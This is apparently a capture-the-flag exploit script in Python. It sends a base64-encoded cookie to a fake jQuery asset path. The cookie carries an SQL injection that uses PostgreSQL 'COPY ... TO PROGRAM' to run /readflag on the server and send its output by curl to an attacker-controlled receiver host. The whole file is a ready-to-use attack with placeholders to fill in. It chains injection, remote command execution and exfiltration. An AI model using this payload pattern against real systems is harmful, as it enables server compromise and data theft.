#!/usr/bin/env python3

import requests
import base64
from random import randint

chall_endpoint = 'http://challenge-url'    # Change this
c2_endpoint = '/assets/jquery-3.6.0.slim.min.js'
randvalue = str(randint(50,5000)).encode()
receiver = 'http://your-server' # Change this

__cfuid = base64.b64encode(b'{"id": 1, "output": "U3\', ' + randvalue + b'); copy (SELECT \'\') to program \'curl ' + receiver.encode() + b'?f=`/readflag|base64`\'-- -"}').decode()
cookies = {
    '__cflb': '49f062b5-8b94-4fff-bb41-d504b148aa1b',
    '__cfuid': __cfuid
}
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337"}

r = requests.post(chall_endpoint+c2_endpoint, cookies=cookies, headers=headers)
print(f'[+] Malicious cookie sent.\nCheck your collaborator server')